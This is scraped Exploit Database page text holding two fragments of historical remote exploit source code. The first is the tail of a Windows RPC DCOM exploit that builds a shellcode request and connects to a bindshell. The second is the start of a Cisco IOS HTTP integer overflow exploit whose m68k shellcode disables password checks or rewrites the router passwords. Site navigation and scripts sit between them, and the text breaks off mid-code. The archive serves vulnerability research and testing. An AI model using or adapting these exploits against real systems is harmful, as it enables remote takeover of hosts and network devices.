atoi(optarg);if((port > 65535) || (port < 1)){printf("[-] Select a port between 1-65535\n");return 1;}break;default:usage(argv[0]);return 1;}}if(hostname==NULL){printf("[-] Please enter a hostname with -d\n");exit(1);}printf("RPC DCOM remote exploit - .:[oc192.us]:. Security\n");printf("[+] Resolving host..\n");if((he = gethostbyname(hostname)) == NULL){printf("[-] gethostbyname: Couldnt resolve hostname\n");exit(1);}printf("[+] Done.\n");printf("-- Target: %s:%s:%i, Bindshell:%i, RET=[0x%.8x]\n",targets[type].os, hostname, port, lportl, targets[type].ret);/* drg */lportl=htons(lportl);memcpy(&lport[1], &lportl, 2);*(long*)lport = *(long*)lport ^ 0x9432BF80;memcpy(&sc[471],&lport,4);memcpy(sc+36, (unsigned char *) &targets[type].ret, 4);their_addr.sin_family = AF_INET;their_addr.sin_addr = *((struct in_addr *)he->h_addr);their_addr.sin_port = htons(port);if ((sockfd=socket(AF_INET,SOCK_STREAM,0)) == -1){perror("[-] Socket failed");return(0);}if(connect(sockfd,(struct sockaddr *)&their_addr, sizeof(struct sockaddr)) == -1){perror("[-] Connect failed");return(0);}/* xfocus start */len=sizeof(sc);memcpy(buf2,request1,sizeof(request1));len1=sizeof(request1);*(unsigned long *)(request2)=*(unsigned long *)(request2)+sizeof(sc)/2;*(unsigned long *)(request2+8)=*(unsigned long *)(request2+8)+sizeof(sc)/2;memcpy(buf2+len1,request2,sizeof(request2));len1=len1+sizeof(request2);memcpy(buf2+len1,sc,sizeof(sc));len1=len1+sizeof(sc);memcpy(buf2+len1,request3,sizeof(request3));len1=len1+sizeof(request3);memcpy(buf2+len1,request4,sizeof(request4));len1=len1+sizeof(request4);*(unsigned long *)(buf2+8)=*(unsigned long *)(buf2+8)+sizeof(sc)-0xc;*(unsigned long *)(buf2+0x10)=*(unsigned long *)(buf2+0x10)+sizeof(sc)-0xc;*(unsigned long *)(buf2+0x80)=*(unsigned long *)(buf2+0x80)+sizeof(sc)-0xc;*(unsigned long *)(buf2+0x84)=*(unsigned long *)(buf2+0x84)+sizeof(sc)-0xc;*(unsigned long *)(buf2+0xb4)=*(unsigned long *)(buf2+0xb4)+sizeof(sc)-0xc;*(unsigned long *)(buf2+0xb8)=*(unsigned long *)(buf2+0xb8)+sizeof(sc)-0xc;*(unsigned long *)(buf2+0xd0)=*(unsigned long *)(buf2+0xd0)+sizeof(sc)-0xc;*(unsigned long *)(buf2+0x18c)=*(unsigned long *)(buf2+0x18c)+sizeof(sc)-0xc;/* end xfocus */if (send(sockfd,bindstr,sizeof(bindstr),0)== -1){perror("[-] Send failed");return(0);}len=recv(sockfd, buf1, 1000, 0);if (send(sockfd,buf2,len1,0)== -1){perror("[-] Send failed");return(0);}close(sockfd);sleep(1);their_addr.sin_family = AF_INET;their_addr.sin_addr = *((struct in_addr *)he->h_addr);their_addr.sin_port = lportl;if ((sockfd=socket(AF_INET,SOCK_STREAM,0)) == -1){perror("[-] Socket failed");return(0);}if(connect(sockfd,(struct sockaddr *)&their_addr, sizeof(struct sockaddr)) == -1){printf("[-] Couldnt connect to bindshell, possible reasons:\n");printf("	1:	Host is firewalled\n");printf("	2:	Exploit failed\n");return(0);}printf("[+] Connected to bindshell..\n\n");sleep(2);printf("-- bling bling --\n\n");con(sockfd);return(0);}// milw0rm.com [2003-08-07]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 77
Cisco IOS 12.x/11.x - HTTP Remote Integer Overflow - Hardware remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDCisco IOS 12.x/11.x - HTTP Remote Integer OverflowEDB-ID:77CVE:2003-0647EDB Verified:Author:FXType:remoteExploit:/Platform:HardwareDate:2003-08-10Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/**               ..--==[[ Phenoelit ]]==--..*              /                                     \*             |       CISCO CASUM EST      |*              \..                                 ../*                 ~~---==(MMIII)==---~~*** Cisco IOS 12.x/11.x remote exploit for HTTP integer overflow in URL using* IOS 11.x UDP Echo memory leak for shellcode placing and address calculation.** This code does support exploitation of any 11.x Cisco 1600 and 2500 series* running "ip http server" and "service udp-small-servers". In other words,* port 80 TCP and port 7 UDP have to be open. The exploitation will take a* very long time since the overflow is triggered by sending 2 Gigabytes of* data to the device. Depending on your connection to the target, this may* take up to several DAYS.** Shellcodes:* o In case a 1600 running 11.3(11b) IP only is detected, a runtime IOS* patching shellcode is used. After that, the device will no longer* validate VTY and enable access passwords. Mission accomplished.* o In case of any other 11.x IOS or in case it runs from flash where* code patching is more complicated, the shellcode will replace all* passwords in the config with "phenoelit" and reboot the box. Change* the passwords in the shellcodes if you like.** ---* FX of Phenoelit <fx at phenoelit.de>**/#include <stdio.h>#include <string.h>#include <unistd.h>#include <netinet/in.h>#include <rpc/types.h>#include <netdb.h>#include <sys/socket.h>#include <arpa/inet.h>#include "protocols.h"#include "packets.h"char m68nop[] = "\x4E\x71";char returncode[] ="\x24\x7c\x02\x0b\xfe\x30" //moveal #34340400,%a2 (0x00000000)"\x34\xbc\x4e\x75" //movew #20085,%a2@ (0x00000006)"\x24\x7c\x02\x04\xae\xfa" //moveal #33861370,%a2 (0x0000000A)"\x24\xfc\x30\x3c\x00\x01" //movel #809238529,%a2@+ (0x00000010)"\x24\xfc\x4c\xee\x04\x0c" //movel #1290667020,%a2@+ (0x00000016)"\x24\xfc\xff\xf4\x4e\x5e" //movel #-766370,%a2@+ (0x0000001C)"\x24\xfc\x4e\x75\x00\x00" //movel #1316290560,%a2@+ (0x00000022)"\x24\x7c\x02\x07\x21\x6a" //moveal #34021738,%a2 (0x00000028)"\x34\xbc\x4e\x71" //movew #20081,%a2@ (0x0000002E)"\x24\x4f" //moveal %sp,%a2 (0x00000032)"\x0c\x1f\x00\x02" //cmpib #2,%sp@+ (0x00000034)"\x0c\x97\x02\x19\xfc\xc0" //cmpil #35257536,%sp@ (0x00000038)"\x66\x00\xff\xf4" //bnew 34 <findret> (0x0000003E)"\x24\x8f" //movel %sp,%a2@ (0x00000042)"\x59\x92" //subql #4,%a2@ (0x00000044)"\x2c\x52" //moveal %a2@,%fp (0x00000046)"\x42\x80" //clrl %d0 (0x00000048)"\x4c\xee\x04\x00\xff\xfc" //moveml %fp@(-4),%a2 (0x0000004A)"\x4e\x5e" //unlk %fp (0x00000050)"\x4e\x75" //rts (0x00000052);char modcfg[] ="\x20\x7c\x0f\xf0\x10\xc2" //moveal #267391170,%a0 (0x00000000)"\xe2\xd0" //lsrw %a0@ (0x00000006)"\x46\xfc\x27\x00" //movew #9984,%sr (0x00000008)"\x20\x7c\x0f\xf0\x10\xc2" //moveal #267391170,%a0 (0x0000000C)"\x30\xbc\x00\x01" //movew #1,%a0@ (0x00000012)"\x20\x7c\x0e\x00\x00\x00" //moveal #234881024,%a0 (0x00000016)"\x54\x88" //addql #2,%a0 (0x0000001C)"\x0c\x50\xab\xcd" //cmpiw #-21555,%a0@ (0x0000001E)"\x66\xf8" //bnes 1c <find_magic> (0x00000022)"\x22\x48" //moveal %a0,%a1 (0x00000024)"\x58\x89" //addql #4,%a1 (0x00000026)"\x24\x49" //moveal %a1,%a2 (0x00000028)"\x50\x8a" //addql #8,%a2 (0x0000002A)"\x50\x8a" //addql #8,%a2 (0x0000002C)"\x0c\x12\x00\x00" //cmpib #0,%a2@ (0x0000002E)"\x67\x28" //beqs 5c <end_of_config> (0x00000032)"\x4b\xfa\x00\xc6" //lea %pc@(fc <S_password>),%a5 (0x00000034)"\x61\x5a" //bsrs 94 <strstr> (0x00000038)"\x4a\x80" //tstl %d0 (0x0000003A)"\x67\x08" //beqs 46 <next1> (0x0000003C)"\x28\x40" //moveal %d0,%a4 (0x0000003E)"\x4b\xfa\x00\xcf" //lea %pc@(111 <REPLACE_password>),%a5 (0x00000040)"\x61\x62" //bsrs a8 <nvcopy> (0x00000044)"\x4b\xfa\x00\xc0" //lea %pc@(108 <S_enable>),%a5 (0x00000046)"\x61\x48" //bsrs 94 <strstr> (0x0000004A)"\x4a\x80" //tstl %d0 (0x0000004C)"\x67\x08" //beqs 58 <next2> (0x0000004E)"\x28\x40" //moveal %d0,%a4 (0x00000050)"\x4b\xfa\x00\xc8" //lea %pc@(11c <REPLACE_enable>),%a5 (0x00000052)"\x61\x50" //bsrs a8 <nvcopy> (0x00000056)"\x52\x8a" //addql #1,%a2 (0x00000058)"\x60\xd2" //bras 2e <modmain> (0x0000005A)"\x32\xbc\x00\x00" //movew #0,%a1@ (0x0000005C)"\x7e\x01" //moveq #1,%d7 (0x00000060)"\x2c\x3c\x00\x00\xff\xff" //movel #65535,%d6 (0x00000062)"\x9d\x47" //subxw %d7,%d6 (0x00000068)"\x6b\xfc" //bmis 68 <chksm_delay> (0x0000006A)"\x2a\x48" //moveal %a0,%a5 (0x0000006C)"\x61\x50" //bsrs c0 <chksum> (0x0000006E)"\x32\x86" //movew %d6,%a1@ (0x00000070)"\x7e\x01" //moveq #1,%d7 (0x00000072)"\x28\x3c\x00\x00\xff\xff" //movel #65535,%d4 (0x00000074)"\x99\x47" //subxw %d7,%d4 (0x0000007A)"\x6b\xfc" //bmis 7a <final_delay> (0x0000007C)"\x46\xfc\x27\x00" //movew #9984,%sr (0x0000007E)"\x20\x7c\x0f\xf0\x00\x00" //moveal #267386880,%a0 (0x00000082)"\x2e\x50" //moveal %a0@,%sp (0x00000088)"\x20\x7c\x0f\xf0\x00\x04" //moveal #267386884,%a0 (0x0000008A)"\x20\x50" //moveal %a0@,%a0 (0x00000090)"\x4e\xd0" //jmp %a0@ (0x00000092)"\x28\x4a" //moveal %a2,%a4 (0x00000094)"\x0c\x15\x00\x00" //cmpib #0,%a5@ (0x00000096)"\x67\x08" //beqs a4 <strstr_endofstr> (0x0000009A)"\xb9\x0d" //cmpmb %a5@+,%a4@+ (0x0000009C)"\x67\xf6" //beqs 96 <strstr_2> (0x0000009E)"\x42\x80" //clrl %d0 (0x000000A0)"\x4e\x75" //rts (0x000000A2)"\x20\x0c" //movel %a4,%d0 (0x000000A4)"\x4e\x75" //rts (0x000000A6)"\x7e\x01" //moveq #1,%d7 (0x000000A8)"\x0c\x15\x00\x00" //cmpib #0,%a5@ (0x000000AA)"\x67\x0e" //beqs be <nvcopy_end> (0x000000AE)"\x18\xdd" //moveb %a5@+,%a4@+ (0x000000B0)"\x2c\x3c\x00\x00\xff\xff" //movel #65535,%d6 (0x000000B2)"\x9d\x47" //subxw %d7,%d6 (0x000000B8)"\x6b\xfc" //bmis b8 <nvcopy_delay> (0x000000BA)"\x60\xec" //bras aa <nvcopyl1> (0x000000BC)"\x4e\x75" //rts (0x000000BE)"\x42\x87" //clrl %d7 (0x000000C0)"\x42\x80" //clrl %d0 (0x000000C2)"\x0c\x55\x00\x00" //cmpiw #0,%a5@ (0x000000C4)"\x66\x0a" //bnes d4 <chk_hack> (0x000000C8)"\x52\x80" //addql #1,%d0 (0x000000CA)"\x0c\x80\x00\x00\x00\x0a" //cmpil #10,%d0 (0x000000CC)"\x67\x08" //beqs dc <chk2> (0x000000D2)"\x42\x86" //clrl %d6 (0x000000D4)"\x3c\x1d" //movew %a5@+,%d6 (0x000000D6)"\xde\x86" //addl %d6,%d7 (0x000000D8)"\x60\xe8" //bras c4 <chk1> (0x000000DA)"\x2c\x07" //movel %d7,%d6 (0x000000DC)"\x2a\x07" //movel %d7,%d5 (0x000000DE)"\x02\x86\x00\x00\xff\xff" //andil #65535,%d6 (0x000000E0)"\xe0\x8d" //lsrl #8,%d5 (0x000000E6)"\xe0\x8d" //lsrl #8,%d5 (0x000000E8)"\xdc\x45" //addw %d5,%d6 (0x000000EA)"\x28\x06" //movel %d6,%d4 (0x000000EC)"\x02\x84\xff\xff\x00\x00" //andil #-65536,%d4 (0x000000EE)"\x66\x00\xff\xea" //bnew e0 <chk3> (0x000000F4)"\x46\x46" //notw %d6 (0x000000F8)"\x4e\x75" //rts (0x000000FA)"\x0a"" password ""\x00""\x0a""enable ""\x00""phenoelit\x0a""\x00""password phenoelit\x0a""\x00";char modcfg2k5[] ="\x46\xfc\x27\x00" //movew #9984,%sr (0x00000000)"\x20\x7c\x02\x00\x00\x00" //moveal #33554432,%a0 (0x00000004)"\x54\x88" //addql #2,%a0 (0x0000000A)"\x0c\x50\xab\xcd" //cmpiw #-21555,%a0@ (0x0000000C)"\x66\xf8" //bnes a <find_magic> (0x00000010)"\x22\x48" //moveal %a0,%a1 (0x00000012)"\x58\x89" //addql #4,%a1 (0x00000014)"\x24\x49" //moveal %a1,%a2 (0x00000016)"\x50\x8a" //addql #8,%a2 (0x00000018)"\x50\x8a" //addql #8,%a2 (0x0000001A)"\x0c\x12\x00\x00" //cmpib #0,%a2@ (0x0000001C)"\x67\x28" //beqs 4a <end_of_config> (0x00000020)"\x4b\xfa\x00\xd6" //lea %pc@(fa <S_password>),%a5 (0x00000022)"\x61\x6a" //bsrs 92 <strstr> (0x00000026)"\x4a\x80" //tstl %d0 (0x00000028)"\x67\x08" //beqs 34 <next1> (0x0000002A)"\x28\x40" //moveal %d0,%a4 (0x0000002C)"\x4b\xfa\x00\xdf" //lea %pc@(10f <REPLACE_password>),%a5 (0x0000002E)"\x61\x72" //bsrs a6 <nvcopy> (0x00000032)"\x4b\xfa\x00\xd0" //lea %pc@(106 <S_enable>),%a5 (0x00000034)"\x61\x58" //bsrs 92 <strstr> (0x00000038)"\x4a\x80" //tstl %d0 (0x0000003A)"\x67\x08" //beqs 46 <next2> (0x0000003C)"\x28\x40" //moveal %d0,%a4 (0x0000003E)"\x4b\xfa\x00\xd8" //lea %pc@(11a <REPLACE_enable>),%a5 (0x00000040)"\x61\x60" //bsrs a6 <nvcopy> (0x00000044)"\x52\x8a" //addql #1,%a2 (0x00000046)"\x60\xd2" //bras 1c <modmain> (0x00000048)"\x42\x80" //clrl %d0 (0x0000004A)"\x2a\x49" //moveal %a1,%a5 (0x0000004C)"\x52\x00" //addqb #1,%d0 (0x0000004E)"\x1a\xfc\x00\x00" //moveb #0,%a5@+ (0x00000050)"\x7e\x01" //moveq #1,%d7 (0x00000054)"\x2c\x3c\x00\x00\xff\xff" //movel #65535,%d6 (0x00000056)"\x9d\x47" //subxw %d7,%d6 (0x0000005C)"\x6b\xfc" //bmis 5c <chksm_delay> (0x0000005E)"\x0c\x00\x00\x02" //cmpib #2,%d0 (0x00000060)"\x66\xe8" //bnes 4e <chksm_del> (0x00000064)"\x2a\x48" //moveal %a0,%a5 (0x00000066)"\x61\x54" //bsrs be <chksum> (0x00000068)"\x2a\x49" //moveal %a1,%a5 (0x0000006A)"\x52\x8d" //addql #1,%a5 (0x0000006C)"\x42\x80" //clrl %d0 (0x0000006E)"\x52\x00" //addqb #1,%d0 (0x00000070)"\x1a\x86" //moveb %d6,%a5@ (0x00000072)"\x7e\x01" //moveq #1,%d7 (0x00000074)"\x28\x3c\x00\x00\xff\xff" //movel #65535,%d4 (0x00000076)"\x99\x47" //subxw %d7,%d4 (0x0000007C)"\x6b\xfc" //bmis 7c <final_delay> (0x0000007E)"\xe0\x4e" //lsrw #8,%d6 (0x00000080)"\x2a\x49" //moveal %a1,%a5 (0x00000082)"\x0c\x00\x00\x02" //cmpib #2,%d0 (0x00000084)"\x66\xe6" //bnes 70 <final_wr> (0x00000088)"\x20\x7c\x03\x00\x00\x60" //moveal #50331744,%a0 (0x0000008A)"\x4e\xd0" //jmp %a0@ (0x00000090)"\x28\x4a" //moveal %a2,%a4 (0x00000092)"\x0c\x15\x00\x00" //cmpib #0,%a5@ (0x00000094)"\x67\x08" //beqs a2 <strstr_endofstr> (0x00000098)"\xb9\x0d" //cmpmb %a5@+,%a4@+ (0x0000009A)"\x67\xf6" //beqs 94 <strstr_2> (0x0000009C)"\x42\x80" //clrl %d0 (0x0000009E)"\x4e\x75" //rts (0x000000A0)"\x20\x0c" //movel %a4,%d0 (0x000000A2)"\x4e\x75" //rts (0x000000A4)"\x7e\x01" //moveq #1,%d7 (0x000000A6)"\x0c\x15\x00\x00" //cmpib #0,%a5@ (0x000000A8)"\x67\x0e" //beqs bc <nvcopy_end> (0x000000AC)"\x18\xdd" //moveb %a5@+,%a4@+ (0x000000AE)"\x2c\x3c\x00\x00\xff\xff" //movel #65535,%d6 (0x000000B0)"\x9d\x47" //subxw %d7,%d6 (0x000000B6)"\x6b\xfc" //bmis b6 <nvcopy_delay> (0x000000B8)"\x60\xec" //bras a8 <nvcopyl1> (0x000000BA)"\x4e\x75" //rts (0x000000BC)"\x42\x87" //clrl %d7 (0x000000BE)"\x42\x80" //clrl %d0 (0x000000C0)"\x0c\x55\x00\x00" //cmpiw #0,%a5@ (0x000000C2)"\x66\x0a" //bnes d2 <chk_hack> (0x000000C6)"\x52\x80" //addql #1,%d0 (0x000000C8)"\x0c\x80\x00\x00\x00\x14" //cmpil #20,%d0 (0x000000CA)"\x67\x08" //beqs da <chk2> (0x000000D0)"\x42\x86" //clrl %d6 (0x000000D2)"\x3c\x1d" //movew %a5@+,%d6 (0x000000D4)"\xde\x86" //addl %d6,%d7 (0x000000D6)"\x60\xe8" //bras c2 <chk1> (0x000000D8)"\x2c\x07" //movel %d7,%d6 (0x000000DA)"\x2a\x07" //movel %d7,%d5 (0x000000DC)"\x02\x86\x00\x00\xff\xff" //andil #65535,%d6 (0x000000DE)"\xe0\x8d" //lsrl #8,%d5 (0x000000E4)"\xe0\x8d" //lsrl #8,%d5 (0x000000E6)"\xdc\x45" //addw %d5,%d6 (0x000000E8)"\x28\x06" //movel %d6,%d4 (0x000000EA)"\x02\x84\xff\xff\x00\x00" //andil #-65536,%d4 (0x000000EC)"\x66\x00\xff\xea" //bnew de <chk3> (0x000000F2)"\x46\x46" //notw %d6 (0x000000F6)"\x4e\x75" //rts (0x000000F8)"\x0a"" password ""\x00""\x0a""enable ""\x00""phenoelit\x0a""\x00""password phenoelit\x0a""\x00";//// address selection strategies//#define S_RANDOM 1#define S_LAST 2#define S_SMALLEST 3#define S_HIGHEST 4#define S_FREQUENT 5typedef struct {unsigned int a;unsigned int count;} addrs_t;#define LOW_ADDR_THR 5#define LOW_COUNT_THR 3//// IO memory block header based fingerprinting//static struct {unsigned int PC_start;unsigned int PC_end;unsigned int IO_start;unsigned int IO_end;char *name;unsigned char *code;unsigned int codelen;unsigned char *nop;unsigned int noplen;unsigned int fakefp;} cisco_boxes[] = {{0x08000000, 0x08ffffff, 0x02C00000, 0x02FFFFFF,"Cisco 1600 series, run from Flash",modcfg, sizeof(modcfg)-1,m68nop, sizeof(m68nop)-1 ,0x02f0f1f2},{0x0208F600, 0x0208F93C, 0x02C00000, 0x02FFFFFF,"Cisco 1603, 11.3(11b) IP only, run from RAM",returncode, sizeof(returncode)-1,m68nop, sizeof(m68nop)-1 ,0x02f0f1f2},{0x03000000, 0x037FFFFF, 0x00E00000, 0x00FFFFFF,"Cisco 2500 series, run from Flash",modcfg2k5, sizeof(modcfg2k5)-1,m68nop, sizeof(m68nop)-1,0x00079000},{0,0,0,0,NULL,NULL,0,NULL,0,0}};// ***************** Status and other tracking *******************//// HTTP communication//struct {int sfd;unsigned int done;} http;//// UDP leak//#define MAXADDRS 100#define DEFAULTRUNS 206#define LOCALPORT 31336 // almost 31337 ;)#define PACKETMAX 1400struct {int sfd;int udpsfd;int guess;addrs_t addrs[MAXADDRS];unsigned int addrc;unsigned int lastaddr;int nop_offset;int nop_sled;} leak;//// config//struct {char *device;char *target;struct in_addr target_addr;int verbose;int testmode;int strategy;unsigned int leakme;unsigned int timeout;unsigned int leakruns;} cfg;//// function prototypes//void usage(char *s);void *smalloc(size_t s);int HTTPpre(void);void HTTPsend(char *what);int IOSlack(unsigned int runs, int shellcode);unsigned char *UDPecho( unsigned int *plen,unsigned char *payload, unsigned int payload_len);void UDPanalyze(unsigned char *b, unsigned int len,unsigned char *expected, unsigned int expected_length);unsigned int SelectAddress(void);int CheckForbidden(unsigned int address);// *************************** main code *************************int main(int argc, char **argv) {//// HTTP elements//char token6[] ="/Cisco";char token50[]="/AnotherLemmingAndAntoherLemmingAndAnotherLemmingX";char token48[]="/HereComesTheFinalLemmingAndClosesTheGapForever/";char httpend[]=" HTTP/1.0\r\n\r\n";char overflow[30];//// stuff we need//unsigned int i;int saved_guess;unsigned int retaddr;//// command line//char option;extern char *optarg;//// output stuff//double percent;double lpercent=(double)0;memset(&cfg,0,sizeof(cfg));memset(&leak,0,sizeof(leak));memset(&http,0,sizeof(http));//// set defaults//cfg.leakme=0x4C00;cfg.timeout=3;cfg.leakruns=DEFAULTRUNS;cfg.strategy=S_SMALLEST;while ((option=getopt(argc,argv,"vTA:t:L:R:d:i:"))!=EOF) {switch(option) {case 'v': cfg.verbose++;break;case 'T': cfg.testmode++;break;case 'A': cfg.strategy=(int)strtoul(optarg,(char **)NULL,10);break;case 't': cfg.timeout=(int)strtoul(optarg,(char **)NULL,10);break;case 'L': cfg.leakme=(int)strtoul(optarg,(char **)NULL,10);break;case 'R': cfg.leakruns=(int)strtoul(optarg,(char **)NULL,10);break;case 'd': {struct hostent *he;if ((he=gethostbyname(optarg))==NULL) {fprintf(stderr,"Could not resolve %s\n",cfg.target);return (-1);}bcopy(he->h_addr,(char *)&(cfg.target_addr.s_addr),he->h_length);cfg.target=smalloc(strlen(optarg)+1);strcpy(cfg.target,optarg);}break;case 'i': cfg.device=smalloc(strlen(optarg)+1);strcpy(cfg.device,optarg);break;default: usage(argv[0]);// does not return}}//// idiot check//if ( !(cfg.device && *((u_int32_t *)&(cfg.target_addr)) ))usage(argv[0]);//// verify the UDP leak and make sure it's a known box//if (IOSlack(1,-1)!=0) {fprintf(stderr,"You need an IOS 11.x target with UDP echo service enabled\n""for this thing to work. Obviously, you don't have 